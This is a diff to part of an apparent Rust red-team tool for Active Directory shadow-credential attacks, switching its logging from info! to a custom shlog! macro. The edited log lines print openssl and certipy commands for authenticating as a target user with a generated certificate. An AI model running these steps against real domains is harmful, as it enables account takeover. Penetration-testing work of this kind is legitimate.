@@ -10,11 +10,13 @@
 use std::time::{SystemTime, UNIX_EPOCH};
 
 use anyhow::{Context, Result};
-use log::{debug, info, trace};
+use log::{debug, trace};
 use rand::RngCore;
 use rsa::pkcs8::EncodePrivateKey;
 use rsa::traits::PublicKeyParts;
 use sha2::{Digest, Sha256};
+
+use crate::shlog;
 
 /// [MS-ADTS] attribute holding the Key Trust credentials.
 pub const KEYCRED_ATTR: &str = "msDS-KeyCredentialLink";
@@ -168,31 +170,31 @@ pub fn write_cert_files_and_hint(target: &str, domain: &str, m: &ShadowCredMater
     std::fs::write(&crt_path, &m.crt_pem).with_context(|| format!("writing {crt_path}"))?;
     std::fs::write(&key_path, &m.key_pem).with_context(|| format!("writing {key_path}"))?;
 
-    info!("Certificate written to '{crt_path}'");
-    info!("Private key  written to '{key_path}'");
-    info!("Convert to PFX then authenticate:");
-    info!("      openssl pkcs12 -export -in {crt_path} -inkey {key_path} -out {safe_name}.pfx -passout pass:");
-    info!("      certipy auth -pfx {safe_name}.pfx -dc-ip <dc_ip> -domain {domain} -username {target}");
-    info!("To clean up: remove_shadow_cred {target} {}", format_device_guid(&m.device_id));
+    shlog!("Certificate written to '{crt_path}'");
+    shlog!("Private key  written to '{key_path}'");
+    shlog!("Convert to PFX then authenticate:");
+    shlog!("      openssl pkcs12 -export -in {crt_path} -inkey {key_path} -out {safe_name}.pfx -passout pass:");
+    shlog!("      certipy auth -pfx {safe_name}.pfx -dc-ip <dc_ip> -domain {domain} -username {target}");
+    shlog!("To clean up: remove_shadow_cred {target} {}", format_device_guid(&m.device_id));
     Ok(())
 }
 
 /// Print a parsed list of shadow credentials.
 pub fn print_list(target: &str, values: &[String]) {
     if values.is_empty() {
-        info!("No shadow credentials on '{target}'");
+        shlog!("No shadow credentials on '{target}'");
         return;
     }
-    info!("{} shadow credential(s) on '{target}':", values.len());
+    shlog!("{} shadow credential(s) on '{target}':", values.len());
     for (i, v) in values.iter().enumerate() {
         if let Some(kc) = parse_dnwithbinary(v) {
-            info!(
+            shlog!(
                 "    [{i}] DeviceID: {}  |  Created: {}",
                 format_device_guid(&kc.device_id),
                 filetime_to_utc(kc.creation_time)
             );
         } else {
-            info!("    [{i}] (unparseable entry)");
+            shlog!("    [{i}] (unparseable entry)");
         }
     }
 }
